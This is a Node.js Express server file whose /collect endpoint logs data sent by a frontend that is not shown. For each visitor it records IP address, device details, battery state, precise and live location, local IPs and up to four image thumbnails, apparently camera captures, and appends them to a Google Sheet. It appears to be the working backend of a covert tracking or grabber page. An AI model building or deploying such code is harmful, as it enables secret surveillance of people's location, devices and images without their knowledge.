import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import { google } from 'googleapis';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 8080;

// Serve the frontend index.html (single-app deployment)
app.use(express.static(__dirname));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// API middleware
app.use(cors());
app.use(bodyParser.json({ limit: '15mb' }));

// Google Sheets client (Service Account)
const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  undefined,
  (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
  ['https://www.googleapis.com/auth/spreadsheets']
);
const sheets = google.sheets({ version: 'v4', auth });

// Brand/model inference
function inferBrandModel(ua = '', gpu = {}) {
  const t = ua.toLowerCase();
  if (t.includes('iphone')) return { brand: 'Apple', model: 'iPhone' };
  if (t.includes('ipad')) return { brand: 'Apple', model: 'iPad' };
  if (t.includes('sm-') || t.includes('samsung')) return { brand: 'Samsung', model: 'Galaxy/SM series' };
  if (t.includes('pixel')) return { brand: 'Google', model: 'Pixel' };
  if (t.includes('redmi') || t.includes('xiaomi') || t.includes('mi ')) return { brand: 'Xiaomi', model: 'Mi/Redmi' };
  if (t.includes('oneplus')) return { brand: 'OnePlus', model: 'OnePlus' };
  if (t.includes('vivo')) return { brand: 'Vivo', model: 'Vivo' };
  if (t.includes('oppo')) return { brand: 'Oppo', model: 'Oppo' };
  if (t.includes('realme')) return { brand: 'Realme', model: 'Realme' };
  const gr = `${gpu.vendor || ''} ${gpu.renderer || ''}`.toLowerCase();
  if (gr.includes('apple')) return { brand: 'Apple', model: 'Apple GPU device' };
  if (gr.includes('adreno')) return { brand: 'Android (Qualcomm)', model: 'Adreno-based' };
  if (gr.includes('mali')) return { brand: 'Android (ARM)', model: 'Mali-based' };
  return { brand: 'Unknown', model: 'Unknown' };
}

// Append a row to Google Sheets
async function appendToSheet(row) {
  await sheets.spreadsheets.values.append({
    spreadsheetId: process.env.GOOGLE_SHEET_ID,
    range: 'Logs!A1',
    valueInputOption: 'RAW',
    requestBody: { values: [row] }
  });
}

// Collect route
app.post('/collect', async (req, res) => {
  try {
    // Public IP
    const ipHeader = req.headers['x-forwarded-for'];
    const clientIp = Array.isArray(ipHeader)
      ? ipHeader[0]
      : (ipHeader || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';

    const body = req.body || {};
    const { ts, hints, gpu, battery, ips, location, liveLocations, burstImages } = body;

    // Basic validation
    if (!ts || !hints || !hints.ua) {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    const brandModel = inferBrandModel(hints.ua, gpu);

    // Optional: include thumbnails directly in sheet (small data URLs from frontend)
    const img1 = burstImages?.[0] || '';
    const img2 = burstImages?.[1] || '';
    const img3 = burstImages?.[2] || '';
    const img4 = burstImages?.[3] || '';

    const row = [
      ts,
      clientIp,
      hints.ua,
      brandModel.brand,
      brandModel.model,
      gpu?.vendor || '',
      gpu?.renderer || '',
      battery?.levelPercent ?? '',
      battery?.charging ?? '',
      location?.lat ?? '',
      location?.lon ?? '',
      location?.acc ?? '',
      JSON.stringify(liveLocations || []),
      JSON.stringify(ips || {}),
      img1,
      img2,
      img3,
      img4
    ];

    await appendToSheet(row);
    return res.json({ ok: true, ip: clientIp, brandModel });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log('Server running on port', PORT);
});
